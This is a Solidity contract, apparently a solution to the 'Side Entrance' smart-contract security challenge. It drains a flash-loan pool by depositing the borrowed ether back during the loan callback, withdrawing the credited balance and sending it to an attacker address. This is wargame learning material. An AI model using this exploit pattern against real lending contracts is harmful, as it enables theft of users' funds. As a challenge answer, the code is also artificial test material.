// SPDX-License-Identifier: MIT


pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import{SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
contract AttackSideEntrance{

address public attacker=0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
uint256 public constant POOL_BALANCE= 1000 ether;
SideEntranceLenderPool public sEntrance;
uint256 public hackAmount;
constructor(address _sEntrance){
sEntrance=SideEntranceLenderPool(_sEntrance);
}
function execute() external payable{
      sEntrance.deposit{value:msg.value}();
      hackAmount=msg.value;
}
function attackPool()external {
    sEntrance.flashLoan(POOL_BALANCE);
}
function sendEthToPlayer() external{
    sEntrance.withdraw();
    (bool success,)=payable(attacker).call{value:hackAmount}("");
    require(success,"hack-failed!");
}

receive() external payable{
    
}
}

